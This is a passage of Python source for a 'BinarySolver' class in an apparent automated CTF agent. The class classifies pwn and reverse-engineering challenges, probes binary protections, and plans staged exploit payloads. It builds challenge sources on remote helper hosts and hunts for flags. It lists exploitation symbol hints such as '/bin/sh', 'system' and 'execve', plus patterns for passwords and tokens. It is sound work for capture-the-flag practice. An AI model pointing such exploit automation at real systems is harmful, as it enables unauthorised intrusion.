import base64
import binascii
import json
import re
import shlex
import sys
import time
from pathlib import Path

from ctf_agent.core.board import build_triage_board
from ctf_agent.core.memory import StateMemory
from ctf_agent.core.models import ChallengeState
from ctf_agent.core.profiles import get_profile
from ctf_agent.solvers.base import BaseSolver


class BinarySolver(BaseSolver):
    SOURCE_BUILD_SUFFIXES = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".asm", ".s"}
    SOURCE_BUILD_FILENAMES = {"makefile", "cmakelists.txt"}
    TEXT_SUFFIXES = {
        ".txt",
        ".md",
        ".json",
        ".yaml",
        ".yml",
        ".xml",
        ".csv",
        ".log",
        ".py",
        ".js",
        ".php",
        ".java",
        ".c",
        ".cc",
        ".cpp",
        ".h",
        ".hpp",
        ".asm",
        ".s",
        ".ps1",
        ".sh",
        ".go",
        ".rs",
    }
    BINARY_SUFFIXES = {".exe", ".dll", ".bin", ".elf", ".so", ".o", ".out", ".class", ".jar", ".apk", ".ipa"}
    ARCHIVE_SUFFIXES = {".zip", ".7z", ".rar", ".gz", ".tgz", ".tar", ".xz"}
    PRINTABLE_PATTERN = re.compile(rb"[\x20-\x7e]{4,}")
    BASE64_PATTERN = re.compile(r"\b(?:[A-Za-z0-9+/]{12,}={0,2})\b")
    HEX_PATTERN = re.compile(r"\b(?:0x)?[0-9a-fA-F]{16,}\b")
    INPUT_HINT_PATTERN = re.compile(
        r"(?i)(?:magic|flag|key|password|pass|token|input|arg|argv|secret|payload)\s*[:=]\s*([A-Za-z0-9_@!#$%^&*+=:/.-]{3,80})"
    )
    QUOTED_STRING_PATTERN = re.compile(r'["\']([A-Za-z0-9_@!#$%^&*+=:/.-]{3,80})["\']')
    BINARY_PROTOCOL_PATTERN = re.compile(r"(?i)(usage|payload|enter|input|name|password|magic|token|flag)")
    PWN_SYMBOL_HINTS = [
        "/bin/sh",
        "system",
        "execve",
        "gets",
        "printf",
        "puts",
        "read",
        "write",
        "win",
        "shell",
        "malloc",
        "free",
        "atoi",
        "__stack_chk_fail",
    ]
    REVERSE_HINTS = [
        "strcmp",
        "memcmp",
        "decode",
        "decrypt",
        "base64",
        "xor",
        "rot",
        "table",
        "correct",
        "wrong",
        "license",
        "bytecode",
        "opcode",
        "vm",
        "state",
        "patch",
    ]

    def __init__(self, file_tool, shell_tool, verifier, toolkit_tool=None, remote_tool=None, mcp_registry=None, profile=None, policy=None):
        self.file_tool = file_tool
        self.shell_tool = shell_tool
        self.verifier = verifier
        self.toolkit_tool = toolkit_tool
        self.remote_tool = remote_tool
        self.mcp_registry = mcp_registry
        self.profile = profile or {}
        self.policy = dict(policy or {})
        self._wsl_shell_available = None

    def solve(self, challenge, workspace):
        workspace = Path(workspace)
        artifact_root = workspace / "artifacts"
        artifact_root.mkdir(parents=True, exist_ok=True)
        state = ChallengeState(phase="collect")
        memory = StateMemory(state)
        self._bind_runtime_context(challenge, workspace, memory=memory, context={})
        solver_meta = self._resolve_solver_metadata(challenge)
        autopilot = dict(solver_meta.get("autopilot") or {})
        knowledge = dict(solver_meta.get("knowledge") or {})
        category = self._normalize_category(knowledge.get("selected_skill_category") or challenge.category)
        profile = self.profile or get_profile(category)
        self._seed_memory(memory, profile, autopilot, knowledge)

        attachment_summaries = []
        binary_candidates = []
        source_build_candidates = []
        text_blobs = []
        for attachment in challenge.attachments:
            summary = self._inspect_attachment(Path(attachment), artifact_root, memory)
            attachment_summaries.append(summary)
            if summary.get("kind") == "binary":
                binary_candidates.append(summary)
            if summary.get("source_build_candidate"):
                source_build_candidates.append(summary)
            if summary.get("preview_text"):
                text_blobs.append(summary.get("preview_text", ""))

        remote_selection = self._select_remote_host(challenge, category)
        remote_reports = []
        binary_context = {
            "subtype": "",
            "summary": "",
            "protections": {},
            "interesting_symbols": [],
            "candidate_inputs": [],
            "candidate_input_count": 0,
            "exploit_plan_count": 0,
            "best_path": "",
            "mcp_used": False,
            "remote_used": False,
            "used_tools": [],
            "used_mcp": [],
            "capability_plan": {},
            "selected_debugger": {},
            "selected_analyzer": {},
            "analysis_strategy": {},
            "recommended_remote_templates": [],
            "debug_helpers": [],
            "pwn_probe": {},
            "angr_probe": {},
            "pwn_capabilities": {},
            "pwn_env_doctor": {},
            "pwn_wave2_reports": [],
            "pwn_parity": {},
            "pwn_family": "",
            "pwn_family_confidence": 0.0,
            "pwn_family_evidence": [],
            "pwn_family_candidates": [],
            "pwn_stage_status": {},
            "exploit_stub_generated": False,
            "stage2_generated": False,
            "pwn_hard_reports": [],
            "hard_blockers": [],
            "leak_artifacts": [],
            "resolved_libc_context": {},
            "stage1_payload": {},
            "stage2_payload": {},
            "exploit_transcript": {},
            "build_profile": "",
            "build_capabilities": {},
            "build_missing": [],
            "build_recommended": [],
            "suggested_build_template": "",
            "source_build": {},
            "build_reports": [],
            "debug_trace": {},
        }
        self._runtime_context = binary_context

        prebuilt_remote_context = {}
        if category == "pwn" and source_build_candidates:
            source_build_payload = self._maybe_build_source_binary(
                challenge,
                workspace,
                artifact_root,
                source_build_candidates,
                remote_selection,
                remote_reports,
                memory,
            )
            binary_context["source_build"] = dict(source_build_payload or {})
            binary_context["build_reports"] = list((source_build_payload or {}).get("reports") or [])
            binary_context["build_profile"] = str((source_build_payload or {}).get("build_profile") or "")
            binary_context["build_capabilities"] = dict((source_build_payload or {}).get("build_capabilities") or {})
            binary_context["build_missing"] = list((source_build_payload or {}).get("build_missing") or [])
            binary_context["build_recommended"] = list((source_build_payload or {}).get("build_recommended") or [])
            binary_context["suggested_build_template"] = str((source_build_payload or {}).get("suggested_build_template") or "")
            build_candidate = dict((source_build_payload or {}).get("candidate") or {})
            if build_candidate:
                binary_candidates.insert(0, build_candidate)
                prebuilt_remote_context = dict((source_build_payload or {}).get("remote_context") or {})

        primary_binary = self._choose_primary_binary(binary_candidates, category)
        if not primary_binary:
            state.blocked_reason = "No binary attachment was identified for the selected workflow."
            memory.record_action("collect", "classify primary binary", "blocked", state.blocked_reason)
            self._write_notes(challenge, workspace, state, profile, attachment_summaries, binary_context)
            self._write_solution_stub(challenge, workspace, state, category, binary_context)
            self._write_board(challenge, workspace, state, attachment_summaries, binary_context, remote_reports, remote_selection)
            return state

        binary_path = Path(primary_binary["path"])
        memory.add_finding("binary", "Primary binary selected", str(binary_path), 0.9)
        if self.toolkit_tool and self.toolkit_tool.is_configured():
            binary_context["selected_analyzer"] = self._select_binary_analyzer(category, "")

        state.phase = "classify"
        strings_text = self._collect_strings(binary_path, artifact_root, memory, binary_context)
        source_text = "\n".join([item for item in text_blobs if item]).strip()
        selected_analyzer = dict(binary_context.get("selected_analyzer") or {})
        analysis_bundle = self._collect_binary_analysis_reports(
            binary_path,
            artifact_root,
            memory,
            category,
            binary_context,
            strings_text,
            selected_analyzer,
        )
        reverse_reports = list(analysis_bundle.get("reports", []))
        reverse_text = str(analysis_bundle.get("text", "") or "")
        binary_context["analysis_strategy"] = dict(analysis_bundle.get("strategy", {}))
        classification = self._classify_binary(category, primary_binary, strings_text, reverse_text, source_text)
        binary_context["subtype"] = classification["subtype"]
        binary_context["summary"] = classification["summary"]
        if self.toolkit_tool and self.toolkit_tool.is_configured():
            binary_context["capability_plan"] = self.toolkit_tool.capability_plan(category, classification["subtype"])
            refined_analyzer = self._select_binary_analyzer(category, classification["subtype"])
            if self._analyzer_changed(selected_analyzer, refined_analyzer):
                binary_context["selected_analyzer"] = refined_analyzer
                refinement_bundle = self._collect_binary_analysis_reports(
                    binary_path,
                    artifact_root,
                    memory,
                    category,
                    binary_context,
                    strings_text,
                    refined_analyzer,
                    existing_reports=reverse_reports,
                )
                refinement_reports = list(refinement_bundle.get("reports", []))
                if refinement_reports:
                    reverse_reports.extend(refinement_reports)
                    reverse_text = "\n\n".join(
                        [item for item in [reverse_text, str(refinement_bundle.get("text", "") or "")] if item]
                    )
                    classification = self._classify_binary(category, primary_binary, strings_text, reverse_text, source_text)
                    binary_context["subtype"] = classification["subtype"]
                    binary_context["summary"] = classification["summary"]
                binary_context["analysis_strategy"] = dict(refinement_bundle.get("strategy", {}))
        binary_context["mcp_used"] = bool(binary_context.get("used_mcp"))
        memory.record_action("classify", "classify binary subtype", "ok", "{0}: {1}".format(classification["subtype"], classification["summary"]))

        state.phase = "extract"
        decoded_candidates = self._collect_decoded_candidates("\n".join([strings_text, reverse_text, source_text]), artifact_root, binary_path.stem, memory)
        interesting_symbols = self._collect_interesting_symbols(strings_text, reverse_text, category)
        binary_context["interesting_symbols"] = interesting_symbols[:20]

        remote_context = self._prepare_remote_context(
            challenge,
            workspace,
            binary_path,
            remote_selection,
            remote_reports,
            memory,
            prebuilt_remote_context=prebuilt_remote_context,
            primary_binary=primary_binary,
        )
        binary_context["remote_used"] = bool(remote_context)
        binary_context["pwn_capabilities"] = dict(remote_context.get("pwn_capabilities") or {})
        binary_context["build_profile"] = str(
            binary_context.get("build_profile")
            or dict(remote_context.get("pwn_capabilities") or {}).get("build_profile")
            or binary_context.get("build_profile")
            or ""
        )
        binary_context["build_capabilities"] = dict(
            binary_context.get("build_capabilities") or dict(remote_context.get("pwn_capabilities") or {}).get("build_capabilities") or {}
        )
        binary_context["build_missing"] = list(
            binary_context.get("build_missing") or dict(remote_context.get("pwn_capabilities") or {}).get("build_missing") or []
        )
        binary_context["build_recommended"] = list(
            binary_context.get("build_recommended") or dict(remote_context.get("pwn_capabilities") or {}).get("build_recommended") or []
        )
        binary_context["suggested_build_template"] = str(
            binary_context.get("suggested_build_template")
            or dict(remote_context.get("pwn_capabilities") or {}).get("suggested_build_template")
            or ""
        )
        protections = self._collect_protections(binary_path, primary_binary, strings_text, remote_context, artifact_root, memory)
        binary_context["protections"] = protections
        if category == "pwn" and remote_context:
            binary_context["pwn_probe"] = self._collect_remote_pwn_probe(
                binary_path,
                artifact_root,
                remote_context,
                memory,
                binary_context,
            )
            binary_context["angr_probe"] = self._collect_remote_angr_probe(
                binary_path,
                artifact_root,
                remote_context,
                memory,
                binary_context,
                subtype=classification["subtype"],
            )
            classification = self._refine_pwn_classification(
                classification,
                binary_context.get("pwn_probe"),
                binary_context.get("angr_probe"),
            )
            binary_context["subtype"] = classification["subtype"]
            binary_context["summary"] = classification["summary"]
            wave2_payload = self._collect_pwn_wave2_reports(
                challenge,
                binary_path,
                protections,
                artifact_root,
                remote_context,
                memory,
                binary_context,
                pwn_probe=binary_context.get("pwn_probe"),
            )
            binary_context["pwn_env_doctor"] = dict(wave2_payload.get("env_doctor") or {})
            binary_context["pwn_wave2_reports"] = list(wave2_payload.get("reports") or [])
            binary_context["debug_helpers"].extend(list(wave2_payload.get("debug_helpers") or []))
            env_doctor = dict(wave2_payload.get("env_doctor") or {})
            if env_doctor:
                binary_context["build_profile"] = str(env_doctor.get("build_profile") or binary_context.get("build_profile") or "")
                binary_context["build_capabilities"] = dict(env_doctor.get("build_capabilities") or binary_context.get("build_capabilities") or {})
                binary_context["build_missing"] = list(env_doctor.get("build_missing", binary_context.get("build_missing", [])) or [])
                binary_context["build_recommended"] = list(env_doctor.get("build_recommended", binary_context.get("build_recommended", [])) or [])
                binary_context["suggested_build_template"] = str(
                    env_doctor.get("suggested_build_template") or binary_context.get("suggested_build_template") or ""
                )
        if category == "pwn":
            binary_context["pwn_parity"] = self._resolve_pwn_parity(
                binary_context.get("pwn_capabilities"),
                binary_context.get("pwn_env_doctor"),
            )
            pwn_family_info = self._classify_pwn_family(
                classification,
                protections,
                strings_text,
                reverse_text,
                source_text,
                binary_context.get("pwn_probe"),
                binary_context.get("angr_probe"),
            )
            binary_context["pwn_family"] = str(pwn_family_info.get("family") or "")
            binary_context["pwn_family_confidence"] = float(pwn_family_info.get("confidence", 0.0) or 0.0)
            binary_context["pwn_family_evidence"] = list(pwn_family_info.get("evidence") or [])
            binary_context["pwn_family_candidates"] = list(pwn_family_info.get("candidates") or [])
            binary_context["hard_blockers"] = list(pwn_family_info.get("blockers") or [])
            binary_context["pwn_stage_status"] = self._seed_pwn_stage_status(
                binary_context.get("pwn_family"),
                binary_context.get("pwn_family_evidence"),
                binary_context.get("pwn_probe"),
            )
            binary_context["leak_artifacts"] = list((binary_context.get("pwn_stage_status") or {}).get("leak_artifacts") or [])
            binary_context["resolved_libc_context"] = dict((binary_context.get("pwn_stage_status") or {}).get("resolved_libc_context") or {})
            binary_context["stage1_payload"] = dict((binary_context.get("pwn_stage_status") or {}).get("stage1_payload") or {})
            binary_context["stage2_payload"] = dict((binary_context.get("pwn_stage_status") or {}).get("stage2_payload") or {})
            binary_context["exploit_transcript"] = dict((binary_context.get("pwn_stage_status") or {}).get("exploit_transcript") or {})
            for item in list(binary_context.get("pwn_wave2_reports") or []):
                report = dict(item or {})
                payload = dict(report.get("payload") or {})
                if payload:
                    merge_report = {
                        "template_kind": str(report.get("template_kind") or ""),
                        "family": binary_context.get("pwn_family") or "",
                    }
                    self._merge_pwn_stage_from_payload(binary_context, payload, merge_report)

        candidate_inputs = self._collect_candidate_inputs(
            category,
            classification["subtype"],
            strings_text,
            reverse_text,
            source_text,
            decoded_candidates,
            selected_analyzer=dict(binary_context.get("selected_analyzer") or {}),
        )
        if category == "pwn":
            interesting_symbols = self._merge_pwn_probe_symbols(interesting_symbols, binary_context.get("pwn_probe"))
            binary_context["interesting_symbols"] = interesting_symbols[:20]
            candidate_inputs = self._merge_pwn_probe_candidates(candidate_inputs, binary_context.get("pwn_probe"))
            candidate_inputs = self._merge_angr_probe_candidates(candidate_inputs, binary_context.get("angr_probe"))
        binary_context["candidate_inputs"] = candidate_inputs[:12]
        binary_context["candidate_input_count"] = len(candidate_inputs)
        if candidate_inputs:
            self.file_tool.write_json(artifact_root / "candidate_inputs.json", candidate_inputs)

        direct_text = "\n".join([strings_text, reverse_text, source_text])
        self._discover_static_flags(direct_text, memory, "binary:strings", False, 0.64)
        for item in decoded_candidates[:12]:
            self._discover_static_flags(item.get("value", ""), memory, "binary:decoded", False, max(0.68, float(item.get("score", 0.0))))

        state.phase = "plan"
        plan_payload = self._build_exploit_plans(
            challenge,
            memory,
            category,
            classification,
            protections,
            interesting_symbols,
            candidate_inputs,
            remote_context,
            artifact_root=artifact_root,
            selected_analyzer=dict(binary_context.get("selected_analyzer") or {}),
            pwn_probe=dict(binary_context.get("pwn_probe") or {}),
            angr_probe=dict(binary_context.get("angr_probe") or {}),
            pwn_family_info={
                "family": binary_context.get("pwn_family", ""),
                "confidence": binary_context.get("pwn_family_confidence", 0.0),
                "evidence": list(binary_context.get("pwn_family_evidence", [])),
                "candidates": list(binary_context.get("pwn_family_candidates", [])),
                "blockers": list(binary_context.get("hard_blockers", [])),
            },
        )
        binary_context["exploit_plan_count"] = len(state.exploit_plans)
        binary_context["recommended_remote_templates"] = list(plan_payload.get("recommended_remote_templates", []))
        prepared_debug_helpers = self._prepare_debug_helpers(binary_path, artifact_root, category, candidate_inputs, interesting_symbols, memory)
        if prepared_debug_helpers:
            binary_context["debug_helpers"] = list(binary_context.get("debug_helpers", [])) + list(prepared_debug_helpers)
        if self.toolkit_tool and self.toolkit_tool.is_configured():
            binary_context["selected_debugger"] = self.toolkit_tool.select_windows_debugger(binary_path)
            binary_context["selected_analyzer"] = dict(binary_context.get("selected_analyzer") or self._select_binary_analyzer(category, classification["subtype"]))
        if binary_context.get("selected_debugger") and not binary_context["selected_debugger"].get("bits") and protections.get("bits"):
            binary_context["selected_debugger"]["bits"] = str(protections.get("bits"))

        state.phase = "attempt"
        attempt_reports = self._attempt_paths(
            challenge,
            binary_path,
            category,
            classification["subtype"],
            candidate_inputs,
            remote_context,
            artifact_root,
            memory,
            selected_analyzer=dict(binary_context.get("selected_analyzer") or {}),
            selected_debugger=dict(binary_context.get("selected_debugger") or {}),
            pwn_probe=dict(binary_context.get("pwn_probe") or {}),
            angr_probe=dict(binary_context.get("angr_probe") or {}),
        )
        self.file_tool.write_json(artifact_root / "exploit_attempts.json", attempt_reports)

        if category == "pwn" and remote_context and not self.verifier.choose_best(state, challenge):
            hard_reports = self._run_pwn_hard_lanes(
                challenge,
                binary_path,
                artifact_root,
                remote_context,
                memory,
                binary_context,
                pwn_probe=dict(binary_context.get("pwn_probe") or {}),
            )
            if hard_reports:
                attempt_reports.extend(hard_reports)
                binary_context["pwn_hard_reports"] = list(hard_reports)
                self.file_tool.write_json(artifact_root / "exploit_attempts.json", attempt_reports)
        if category == "pwn" and remote_context and not self.verifier.choose_best(state, challenge):
            debug_trace = self._maybe_collect_pwn_debug_trace(
                challenge,
                binary_path,
                artifact_root,
                remote_context,
                memory,
                binary_context,
            )
            if debug_trace:
                binary_context["debug_trace"] = dict(debug_trace)
                binary_context["build_reports"] = list(binary_context.get("build_reports", [])) + [dict(debug_trace)]

        state.phase = "validate"
        best_flag = self.verifier.choose_best(state, challenge)
        if best_flag:
            binary_context["best_path"] = best_flag.source
            memory.record_action("validate", "choose best flag", "ok", best_flag.value)
        else:
            best_plan = self._best_plan(state)
            binary_context["best_path"] = "plan:{0}".format(best_plan.method or best_plan.title) if best_plan else "{0}:{1}".format(category, classification["subtype"])
            memory.record_action("validate", "choose best path", "ok", binary_context["best_path"])

        if not best_flag and len(candidate_inputs) > 6 and remote_context:
            state.phase = "retry"
            retry_reports = self._attempt_paths(
                challenge,
                binary_path,
                category,
                classification["subtype"],
                candidate_inputs[6:12],
                remote_context,
                artifact_root,
                memory,
                label="retry",
                selected_analyzer=dict(binary_context.get("selected_analyzer") or {}),
                selected_debugger=dict(binary_context.get("selected_debugger") or {}),
                pwn_probe=dict(binary_context.get("pwn_probe") or {}),
                angr_probe=dict(binary_context.get("angr_probe") or {}),
            )
            attempt_reports.extend(retry_reports)
            self.file_tool.write_json(artifact_root / "exploit_attempts.json", attempt_reports)
            best_flag = self.verifier.choose_best(state, challenge)
            if best_flag:
                binary_context["best_path"] = best_flag.source

        state.phase = "report"
        analysis_payload = self._build_analysis_payload(
            challenge,
            category,
            classification["subtype"],
            classification["summary"],
            binary_path,
            protections,
            interesting_symbols,
            candidate_inputs,
            decoded_candidates,
            reverse_reports,
            attempt_reports,
            remote_context,
            state,
            binary_context["best_path"],
            binary_context["debug_helpers"],
            binary_context,
        )
        analysis_name = "pwn_analysis.json" if category == "pwn" else "reverse_analysis.json"
        self.file_tool.write_json(artifact_root / analysis_name, analysis_payload)
        self._write_notes(challenge, workspace, state, profile, attachment_summaries, binary_context)
        self._write_solution_stub(challenge, workspace, state, category, binary_context)
        self._write_board(challenge, workspace, state, attachment_summaries, binary_context, remote_reports, remote_selection)
        return state

    def _seed_memory(self, memory, profile, autopilot, knowledge):
        goal = profile.get("goal") or "Keep pushing until the binary workflow reaches a validated flag or a clear blocker."
        memory.add_hypothesis(goal)
        if autopilot.get("summary"):
            memory.add_finding("autopilot", "Autopilot plan", autopilot.get("summary", ""), 0.72)
        for hint in list(autopilot.get("solver_hints", []))[:4]:
            memory.add_hypothesis(hint)
        if knowledge.get("pack_name"):
            memory.add_finding("knowledge", "Embedded playbook selected", knowledge.get("pack_name", ""), 0.7)
        if self.toolkit_tool and self.toolkit_tool.is_configured():
            tools = self.toolkit_tool.available_tools()
            if tools:
                memory.add_finding("toolkit", "Local binary tools visible", ", ".join(tools[:8]), 0.82)
        if self.mcp_registry and self.mcp_registry.has_servers():
            reverse_hint = self.mcp_registry.pick_reverse_tool()
            if reverse_hint:
                memory.add_finding("reverse-mcp", "Reverse MCP available", "{0}::{1}".format(reverse_hint["server"], reverse_hint["tool"]["name"]), 0.82)
        if self.remote_tool and self.remote_tool.list_hosts():
            memory.add_finding("remote", "Remote helpers visible", ", ".join(self.remote_tool.list_hosts()), 0.62)

    def _is_source_build_attachment(self, attachment):
        attachment = Path(attachment)
        suffix = attachment.suffix.lower()
        name = attachment.name.lower()
        return suffix in self.SOURCE_BUILD_SUFFIXES or name in self.SOURCE_BUILD_FILENAMES

    def _inspect_attachment(self, attachment, artifact_root, memory):
        summary = {"path": str(attachment), "name": attachment.name, "kind": "unknown", "preview_text": ""}
        suffix = attachment.suffix.lower()
        if not attachment.exists():
            memory.record_action("collect", "inspect {0}".format(attachment.name), "missing", "attachment does not exist")
            summary["kind"] = "missing"
            return summary
        if suffix in self.TEXT_SUFFIXES or self._is_source_build_attachment(attachment):
            preview = self.file_tool.read_text(attachment, limit_bytes=120000)
            artifact = artifact_root / "{0}_preview.txt".format(attachment.stem)
            self.file_tool.write_text(artifact, preview[:80000] + ("\n" if preview else ""))
            memory.record_action("collect", "preview {0}".format(attachment.name), "ok", "captured text preview", str(artifact))
            summary.update(
                {
                    "kind": "text",
                    "artifact": str(artifact),
                    "preview_text": preview[:20000],
                    "source_build_candidate": self._is_source_build_attachment(attachment),
                }
            )
            self._discover_static_flags(preview, memory, "binary:text-preview", False, 0.52)
            return summary
        if suffix in self.ARCHIVE_SUFFIXES:
            memory.record_action("collect", "inspect {0}".format(attachment.name), "queued", "archive queued for binary triage")
            summary["kind"] = "archive"
            return summary
        binary_kind = self._detect_binary_kind(attachment)
        if suffix in self.BINARY_SUFFIXES or binary_kind != "unknown":
            bits = self.toolkit_tool.detect_binary_bitness(attachment) if self.toolkit_tool else ""
            summary.update({"kind": "binary", "binary_kind": binary_kind, "bits": bits})
            memory.record_action("collect", "classify {0}".format(attachment.name), "ok", "binary candidate: {0}".format(binary_kind))
            return summary
        memory.record_action("collect", "inspect {0}".format(attachment.name), "skipped", "no binary-specific handler")
        return summary

    def _detect_binary_kind(self, attachment):
        suffix = attachment.suffix.lower()
        if suffix == ".elf":
            return "elf"
        if suffix in {".exe", ".dll"}:
            return "pe"
        if suffix == ".class":
            return "java-class"
        if suffix == ".jar":
            return "jar"
        if suffix == ".apk":
            return "apk"
        data = self.file_tool.read_bytes(attachment, limit_bytes=8)
        if data.startswith(b"\x7fELF"):
            return "elf"
        if data.startswith(b"MZ"):
            return "pe"
        if data.startswith(b"\xca\xfe\xba\xbe"):
            return "java-class"
        if data.startswith(b"#!/"):
            return "script"
        return "unknown"

    def _choose_primary_binary(self, candidates, category):
        if not candidates:
            return None
        def score(item):
            path = Path(item["path"])
            suffix = path.suffix.lower()
            binary_kind = item.get("binary_kind", "")
            points = 0
            if item.get("generated_by") == "remote-source-build":
                points += 80
            if category == "pwn":
                if binary_kind in {"elf", "script"}:
                    points += 40
                if suffix in {".elf", ".out", ".so", ".bin"}:
                    points += 18
            else:
                if binary_kind in {"pe", "elf", "script", "java-class", "jar", "apk"}:
                    points += 36
                if suffix in {".bin", ".class", ".jar", ".apk"}:
                    points += 14
            return (points, path.stat().st_size if path.exists() else 0)
        return sorted(candidates, key=score, reverse=True)[0]

    def _choose_source_build_template(self, source_items, build_capabilities):
        build_capabilities = dict(build_capabilities or {})
        if not build_capabilities.get("multilib_32"):
            return "pwn-build-native"
        lowered = "\n".join(str(item.get("preview_text", "") or "") for item in list(source_items or []))[:4000].lower()
        if "-m32" in lowered or "__i386__" in lowered or "elf32" in lowered:
            return "pwn-build-multilib"
        return "pwn-build-native"

    def _suggest_source_build_binary_name(self, challenge, source_items):
        title = str(getattr(challenge, "title", "") or "").strip().replace(" ", "_")
        if title:
            return "{0}_built".format(title.lower())
        for item in list(source_items or []):
            path = Path(str(item.get("path") or ""))
            if path.suffix.lower() in {".c", ".cc", ".cpp", ".cxx", ".asm", ".s"}:
                return "{0}_built".format(path.stem.lower())
        return "chall_built"

    def _maybe_build_source_binary(self, challenge, workspace, artifact_root, source_items, remote_selection, remote_reports, memory):
        payload = {
            "status": "skipped",
            "candidate": {},
            "remote_context": {},
            "reports": [],
            "build_profile": "",
            "build_capabilities": {},
            "build_missing": [],
            "build_recommended": [],
            "suggested_build_template": "",
        }
        if not self.remote_tool:
            return payload
        host_name = str(remote_selection.get("selected_host") or "").strip()
        if not host_name:
            memory.record_action("collect", "source build host selection", "skipped", "no remote helper selected for source build")
            return payload
        probe = self.remote_tool.probe(host_name, timeout=18)
        probe["kind"] = "probe"
        remote_reports.append(probe)
        self.file_tool.write_json(workspace / "artifacts" / "source_build_{0}_remote_probe.json".format(host_name), probe)
        pwn_capabilities = dict(probe.get("pwn_capabilities") or {})
        payload["build_profile"] = str(pwn_capabilities.get("build_profile") or "weak")
        payload["build_capabilities"] = dict(pwn_capabilities.get("build_capabilities") or {})
        payload["build_missing"] = list(pwn_capabilities.get("build_missing", []))
        payload["build_recommended"] = list(pwn_capabilities.get("build_recommended", []))
        payload["suggested_build_template"] = str(pwn_capabilities.get("suggested_build_template") or "")
        if probe.get("status") != "ok" or payload["build_profile"] == "weak":
            memory.record_action(
                "collect",
                "source build preflight {0}".format(host_name),
                "warn",
                "build profile={0}; suggested={1}".format(payload["build_profile"] or "weak", payload["suggested_build_template"] or "n/a"),
            )
            return payload
        remote_workspace = self.remote_tool.ensure_workspace(
            host_name,
            run_id=challenge.metadata.get("run_id") or workspace.name,
            timeout=20,
        )
        remote_workspace["kind"] = "workspace"
        remote_reports.append(remote_workspace)
        self.file_tool.write_json(workspace / "artifacts" / "source_build_{0}_remote_workspace.json".format(host_name), remote_workspace)
        if remote_workspace.get("status") != "ok":
            return payload
        remote_input_dir = remote_workspace.get("input_dir") or remote_workspace.get("workspace_root") or "/tmp"
        remote_source_dir = "{0}/source".format(remote_input_dir.rstrip("/"))
        remote_build_dir = "{0}/build".format((remote_workspace.get("artifact_dir") or remote_workspace.get("workspace_root") or "/tmp").rstrip("/"))
        self.remote_tool.run_command(
            host_name,
            "mkdir -p {0} {1}".format(shlex.quote(remote_source_dir), shlex.quote(remote_build_dir)),
            timeout=20,
        )
        remote_sources = []
        seen_names = {}
        for item in list(source_items or []):
            local_path = Path(str(item.get("path") or ""))
            key = local_path.name.lower()
            index = seen_names.get(key, 0) + 1
            seen_names[key] = index
            remote_name = local_path.name if index == 1 else "{0}_{1}{2}".format(local_path.stem, index, local_path.suffix)
            remote_path = "{0}/{1}".format(remote_source_dir.rstrip("/"), remote_name)
            upload = self.remote_tool.upload(host_name, local_path, remote_path=remote_path, timeout=60)
            upload["kind"] = "source-upload"
            remote_reports.append(upload)
            payload["reports"].append(upload)
            if upload.get("status") == "ok":
                remote_sources.append(upload.get("remote_path", ""))
        if not remote_sources:
            return payload
        remote_context = {
            "host": host_name,
            "workspace": remote_workspace,
            "probe": probe,
            "pwn_capabilities": pwn_capabilities,
        }
        build_template = self._choose_source_build_template(source_items, payload["build_capabilities"])
        build_result = self._run_remote_template(
            remote_context,
            build_template,
            artifact_root,
            "source_build",
            memory,
            source_dir=remote_source_dir,
            build_dir=remote_build_dir,
            binary_name=self._suggest_source_build_binary_name(challenge, source_items),
            sources=remote_sources,
        )
        payload["reports"].append(build_result)
        build_payload = dict(build_result.get("payload") or {})
        remote_binary_path = str(build_payload.get("binary_path") or build_payload.get("selected_binary") or "").strip()
        if not remote_binary_path:
            payload["status"] = build_result.get("status", "warn")
            return payload
        local_binary_path = artifact_root / Path(remote_binary_path).name
        download = self.remote_tool.download(host_name, remote_path=remote_binary_path, local_path=local_binary_path, timeout=90)
        download["kind"] = "source-download"
        remote_reports.append(download)
        payload["reports"].append(download)
        if download.get("status") != "ok":
            return payload
        candidate = {
            "path": str(local_binary_path),
            "name": local_binary_path.name,
            "kind": "binary",
            "binary_kind": "elf",
            "bits": self.toolkit_tool.detect_binary_bitness(local_binary_path) if self.toolkit_tool else "",
            "generated_by": "remote-source-build",
            "remote_binary_path": remote_binary_path,
        }
        payload["candidate"] = candidate
        payload["remote_context"] = {
            "host": host_name,
            "workspace": remote_workspace,
            "binary_path": remote_binary_path,
            "probe": probe,
            "pwn_capabilities": pwn_capabilities,
        }
        payload["status"] = "ok"
        memory.record_action("collect", "remote source build", "ok", "built {0} via {1}".format(local_binary_path.name, build_template), str(local_binary_path))
        return payload

    def _collect_strings(self, binary_path, artifact_root, memory, binary_context):
        artifact = artifact_root / "{0}_strings.txt".format(binary_path.stem)
        text = ""
        if self.toolkit_tool and self.toolkit_tool.has_tool("strings"):
            result = self.toolkit_tool.run_named_tool("strings", [str(binary_path)], timeout=150)
            text = (result.get("stdout", "") or "") + ("\n" + result.get("stderr", "") if result.get("stderr") else "")
            self._record_binary_tool(binary_context, "strings")
            memory.record_action("extract", "strings {0}".format(binary_path.name), result.get("status", "unknown"), "ran local strings", str(artifact))
        else:
            text = self._fallback_extract_strings(binary_path)
            memory.record_action("extract", "fallback strings {0}".format(binary_path.name), "ok" if text else "error", "used Python printable-string fallback", str(artifact))
        if text:
            self.file_tool.write_text(artifact, text[:400000] + ("\n" if not text.endswith("\n") else ""))
        return text

    def _fallback_extract_strings(self, binary_path):
        blob = self.file_tool.read_bytes(binary_path, limit_bytes=400000)
        values = []
        for item in self.PRINTABLE_PATTERN.findall(blob):
            try:
                values.append(item.decode("utf-8", errors="replace"))
            except Exception:
                continue
        return "\n".join(values[:12000])

    def _collect_reverse_reports(self, binary_path, artifact_root, memory, category, binary_context):
        if not self.mcp_registry or not self.mcp_registry.has_servers():
            return [], ""
        self._ensure_reverse_mcp_live(binary_path, memory)
        reports = []
        combined = []
        for index, task in enumerate(self._reverse_tasks(category)):
            payload = self.mcp_registry.analyze_with_reverse_safe(str(binary_path), task=task, timeout=90)
            if self._maybe_pause_on_approval(
                getattr(self, "_runtime_challenge", None),
                getattr(self, "_runtime_workspace", None),
                getattr(self, "_runtime_memory", memory),
                checkpoint="binary:reverse_mcp",
                result=payload,
                context=self._runtime_snapshot(binary_path=str(binary_path), task=task),
                pending_action={"kind": "reverse_mcp", "binary_path": str(binary_path), "task": task},
                blocked_reason=str(payload.get("message", "") or "reverse MCP approval required"),
            ):
                return reports, "\n\n".join(combined)
            if payload.get("status") == "error":
                memory.record_action("extract", "reverse-mcp task {0}".format(index + 1), "error", payload.get("summary", "") or payload.get("message", "reverse analysis failed"))
                continue
            text = self.mcp_registry.flatten_tool_result(payload.get("result"))
